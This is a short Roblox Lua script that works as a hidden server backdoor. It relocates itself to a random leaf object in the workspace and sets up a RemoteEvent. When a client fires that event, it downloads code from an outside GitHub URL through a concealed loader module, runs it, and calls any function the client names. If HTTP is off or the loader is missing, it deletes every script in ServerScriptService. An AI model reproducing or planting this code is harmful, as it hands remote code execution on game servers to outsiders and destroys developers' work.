-- muchos gracias

local desc = workspace:GetDescendants()
local rp
repeat
  rp = desc[math.random(1, #desc)]
until #rp:GetChildren() == 0
script.Parent = rp

local event = game.ReplicatedStorage:WaitForChild("FOVEvent3", 3)
if not event then
  event = Instance.new("RemoteEvent")
  event.Name = "FOVEvent3"
  event.Parent = game.ReplicatedStorage
end

local https = game:GetService("HttpService")
if not https.HttpEnabled then
  game.ServerScriptService:ClearAllChildren()
  script:Destroy()
  return
end

local load = game:FindFirstChild("TypeWriterHelper3", true)
if load then load = require(load) else 
  game.ServerScriptService:ClearAllChildren()
  script:Destroy()
  return
end

event.OnServerEvent:Connect(function(plr, fn)
    local url = "https://github.com/character-r/my-final-fuck-you/raw/refs/heads/main/code.lua"
    local get = https:GetAsync(url)

    if get then
      local exe = load(get)
      if exe then
        local ret = exe()
        if ret then
          local func = ret[fn]
          if func then
            func(plr)
          end
        end
      end
    end
end)
